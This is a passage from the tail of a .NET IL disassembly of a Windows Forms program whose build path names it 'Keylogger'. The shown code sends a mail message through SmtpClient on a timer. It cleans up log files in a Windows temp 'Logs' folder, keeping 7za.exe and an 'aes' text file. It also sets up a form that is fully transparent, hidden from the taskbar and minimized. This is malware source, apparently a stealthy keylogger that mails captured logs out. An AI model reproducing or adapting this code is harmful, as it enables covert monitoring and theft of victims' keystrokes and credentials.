          IL_0d3a:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Port(int32)
          IL_0d3f:  stloc.s    V_14
          .try
          {
            IL_0d41:  ldloc.s    V_14
            IL_0d43:  ldloc.s    V_12
            IL_0d45:  callvirt   instance void [System]System.Net.Mail.SmtpClient::Send(class [System]System.Net.Mail.MailMessage)
            IL_0d4a:  leave.s    IL_0d58

          }  // end .try
          finally
          {
            IL_0d4c:  ldloc.s    V_14
            IL_0d4e:  brfalse.s  IL_0d57

            IL_0d50:  ldloc.s    V_14
            IL_0d52:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
            IL_0d57:  endfinally
          }  // end handler
          IL_0d58:  leave.s    IL_0d66

        }  // end .try
        finally
        {
          IL_0d5a:  ldloc.s    V_12
          IL_0d5c:  brfalse.s  IL_0d65

          IL_0d5e:  ldloc.s    V_12
          IL_0d60:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_0d65:  endfinally
        }  // end handler
        IL_0d66:  leave.s    IL_0d74

      }  // end .try
      finally
      {
        IL_0d68:  ldloc.s    V_11
        IL_0d6a:  brfalse.s  IL_0d73

        IL_0d6c:  ldloc.s    V_11
        IL_0d6e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0d73:  endfinally
      }  // end handler
      IL_0d74:  leave.s    IL_0d82

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0d76:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0d7b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0d80:  leave.s    IL_0d82

    }  // end handler
    IL_0d82:  ldstr      "windir"
    IL_0d87:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0d8c:  ldstr      "\\Temp\\Logs\\"
    IL_0d91:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0d96:  call       string[] [mscorlib]System.IO.Directory::GetFiles(string)
    IL_0d9b:  stloc.s    V_15
    IL_0d9d:  ldc.i4.0
    IL_0d9e:  stloc.s    V_16
    IL_0da0:  br.s       IL_0df1

    IL_0da2:  ldloc.s    V_15
    IL_0da4:  ldloc.s    V_16
    IL_0da6:  ldelem.ref
    IL_0da7:  stloc.s    V_17
    IL_0da9:  ldloc.s    V_17
    IL_0dab:  ldstr      "7za.exe"
    IL_0db0:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_0db5:  ldc.i4.0
    IL_0db6:  ceq
    IL_0db8:  ldloc.s    V_17
    IL_0dba:  ldstr      "aes"
    IL_0dbf:  ldarg.0
    IL_0dc0:  ldfld      object gray.Form1::i
    IL_0dc5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0dca:  ldstr      ".txt"
    IL_0dcf:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0dd4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0dd9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_0dde:  ldc.i4.0
    IL_0ddf:  ceq
    IL_0de1:  and
    IL_0de2:  brfalse.s  IL_0deb

    IL_0de4:  ldloc.s    V_17
    IL_0de6:  call       void [mscorlib]System.IO.File::Delete(string)
    IL_0deb:  ldloc.s    V_16
    IL_0ded:  ldc.i4.1
    IL_0dee:  add.ovf
    IL_0def:  stloc.s    V_16
    IL_0df1:  ldloc.s    V_16
    IL_0df3:  ldloc.s    V_15
    IL_0df5:  ldlen
    IL_0df6:  conv.i4
    IL_0df7:  blt.s      IL_0da2

    IL_0df9:  ldarg.0
    IL_0dfa:  ldflda     object gray.Form1::i
    IL_0dff:  dup
    IL_0e00:  stloc.s    V_18
    IL_0e02:  ldloc.s    V_18
    IL_0e04:  ldind.ref
    IL_0e05:  ldc.i4.1
    IL_0e06:  box        [mscorlib]System.Int32
    IL_0e0b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                   object)
    IL_0e10:  stind.ref
    IL_0e11:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0e16:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0e1b:  ldloc.s    V_5
    IL_0e1d:  ldloc.3
    IL_0e1e:  ldc.i4.1
    IL_0e1f:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_0e24:  ret
  } // end of method Form1::Timer1_Tick

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer gray.Form1::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer gray.Form1::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form1::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       211 (0xd3)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System]System.ComponentModel.Container::.ctor()
    IL_0006:  stfld      class [System]System.ComponentModel.IContainer gray.Form1::components
    IL_000b:  ldarg.0
    IL_000c:  ldarg.0
    IL_000d:  ldfld      class [System]System.ComponentModel.IContainer gray.Form1::components
    IL_0012:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.Timer::.ctor(class [System]System.ComponentModel.IContainer)
    IL_0017:  callvirt   instance void gray.Form1::set_Timer1(class [System.Windows.Forms]System.Windows.Forms.Timer)
    IL_001c:  ldarg.0
    IL_001d:  ldarg.0
    IL_001e:  ldfld      class [System]System.ComponentModel.IContainer gray.Form1::components
    IL_0023:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.Timer::.ctor(class [System]System.ComponentModel.IContainer)
    IL_0028:  callvirt   instance void gray.Form1::set_Timer2(class [System.Windows.Forms]System.Windows.Forms.Timer)
    IL_002d:  ldarg.0
    IL_002e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0033:  ldarg.0
    IL_0034:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::get_Timer2()
    IL_0039:  ldc.i4.1
    IL_003a:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::set_Enabled(bool)
    IL_003f:  ldarg.0
    IL_0040:  ldc.r4     6.
    IL_0045:  ldc.r4     13.
    IL_004a:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_004f:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_0054:  ldarg.0
    IL_0055:  ldc.i4.1
    IL_0056:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_005b:  ldarg.0
    IL_005c:  ldc.i4.0
    IL_005d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_AutoSizeMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoSizeMode)
    IL_0062:  ldarg.0
    IL_0063:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_White()
    IL_0068:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_006d:  ldarg.0
    IL_006e:  ldc.i4.0
    IL_006f:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_BackgroundImageLayout(valuetype [System.Windows.Forms]System.Windows.Forms.ImageLayout)
    IL_0074:  ldarg.0
    IL_0075:  ldc.i4.s   120
    IL_0077:  ldc.i4.s   23
    IL_0079:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_007e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_0083:  ldarg.0
    IL_0084:  ldc.i4.0
    IL_0085:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_008a:  ldarg.0
    IL_008b:  ldstr      "Form1"
    IL_0090:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_0095:  ldarg.0
    IL_0096:  ldc.r8     0.0
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_00a4:  ldarg.0
    IL_00a5:  ldc.i4.0
    IL_00a6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowIcon(bool)
    IL_00ab:  ldarg.0
    IL_00ac:  ldc.i4.0
    IL_00ad:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_00b2:  ldarg.0
    IL_00b3:  ldc.i4.2
    IL_00b4:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_SizeGripStyle(valuetype [System.Windows.Forms]System.Windows.Forms.SizeGripStyle)
    IL_00b9:  ldarg.0
    IL_00ba:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_White()
    IL_00bf:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TransparencyKey(valuetype [System.Drawing]System.Drawing.Color)
    IL_00c4:  ldarg.0
    IL_00c5:  ldc.i4.1
    IL_00c6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00cb:  ldarg.0
    IL_00cc:  ldc.i4.0
    IL_00cd:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00d2:  ret
  } // end of method Form1::InitializeComponent

  .method assembly newslot specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.Timer 
          get_Timer1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer1
    IL_0006:  ret
  } // end of method Form1::get_Timer1

  .method assembly newslot specialname strict virtual 
          instance void  set_Timer1(class [System.Windows.Forms]System.Windows.Forms.Timer WithEventsValue) cil managed synchronized
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       55 (0x37)
    .maxstack  2
    .locals init (class [mscorlib]System.EventHandler V_0,
             class [System.Windows.Forms]System.Windows.Forms.Timer V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldftn      instance void gray.Form1::Timer1_Tick(object,
                                                               class [mscorlib]System.EventArgs)
    IL_0007:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_000c:  stloc.0
    IL_000d:  ldarg.0
    IL_000e:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer1
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  brfalse.s  IL_001e

    IL_0017:  ldloc.1
    IL_0018:  ldloc.0
    IL_0019:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::remove_Tick(class [mscorlib]System.EventHandler)
    IL_001e:  ldarg.0
    IL_001f:  ldarg.1
    IL_0020:  stfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer1
    IL_0025:  ldarg.0
    IL_0026:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer1
    IL_002b:  stloc.1
    IL_002c:  ldloc.1
    IL_002d:  brfalse.s  IL_0036

    IL_002f:  ldloc.1
    IL_0030:  ldloc.0
    IL_0031:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::add_Tick(class [mscorlib]System.EventHandler)
    IL_0036:  ret
  } // end of method Form1::set_Timer1

  .method assembly newslot specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.Timer 
          get_Timer2() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer2
    IL_0006:  ret
  } // end of method Form1::get_Timer2

  .method assembly newslot specialname strict virtual 
          instance void  set_Timer2(class [System.Windows.Forms]System.Windows.Forms.Timer WithEventsValue) cil managed synchronized
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       55 (0x37)
    .maxstack  2
    .locals init (class [mscorlib]System.EventHandler V_0,
             class [System.Windows.Forms]System.Windows.Forms.Timer V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldftn      instance void gray.Form1::Timer2_Tick(object,
                                                               class [mscorlib]System.EventArgs)
    IL_0007:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_000c:  stloc.0
    IL_000d:  ldarg.0
    IL_000e:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer2
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  brfalse.s  IL_001e

    IL_0017:  ldloc.1
    IL_0018:  ldloc.0
    IL_0019:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::remove_Tick(class [mscorlib]System.EventHandler)
    IL_001e:  ldarg.0
    IL_001f:  ldarg.1
    IL_0020:  stfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer2
    IL_0025:  ldarg.0
    IL_0026:  ldfld      class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::_Timer2
    IL_002b:  stloc.1
    IL_002c:  ldloc.1
    IL_002d:  brfalse.s  IL_0036

    IL_002f:  ldloc.1
    IL_0030:  ldloc.0
    IL_0031:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::add_Tick(class [mscorlib]System.EventHandler)
    IL_0036:  ret
  } // end of method Form1::set_Timer2

  .property instance class [System.Windows.Forms]System.Windows.Forms.Timer
          Timer1()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::get_Timer1()
    .set instance void gray.Form1::set_Timer1(class [System.Windows.Forms]System.Windows.Forms.Timer)
  } // end of property Form1::Timer1
  .property instance class [System.Windows.Forms]System.Windows.Forms.Timer
          Timer2()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::get_Timer2()
    .set instance void gray.Form1::set_Timer2(class [System.Windows.Forms]System.Windows.Forms.Timer)
  } // end of property Form1::Timer2
} // end of class gray.Form1


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\root\source\repos\Keylogger\bin\stub.res
